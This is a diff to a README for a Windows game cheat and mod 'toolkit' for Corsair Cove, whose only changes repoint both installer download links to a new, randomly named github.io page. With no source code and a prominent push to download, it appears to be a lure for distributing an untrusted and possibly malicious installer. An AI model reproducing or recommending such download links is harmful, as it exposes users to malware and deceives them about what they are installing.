@@ -2,7 +2,7 @@
 
 Corsair Cove Enhancement Toolkit is the comprehensive 2026 utility designed to elevate your experience in the Corsair Cove world. This all-in-one package provides intuitive tools for resource management, gameplay modifiers, and mod installation, giving you complete control over your gaming environment. Whether you want to ease progression with infinite resources or explore with enhanced abilities, this toolkit offers a seamless and integrated solution for Windows users.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Included
 
@@ -53,7 +53,7 @@ The toolkit includes an automatic update checker that will notify you when a new
 
 For the most recent and secure version of the Corsair Cove Enhancement Toolkit, please use the official download page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *This project is a standalone enhancement utility. Last updated in 2026. Use responsibly and enjoy your enhanced Corsair Cove journey!*
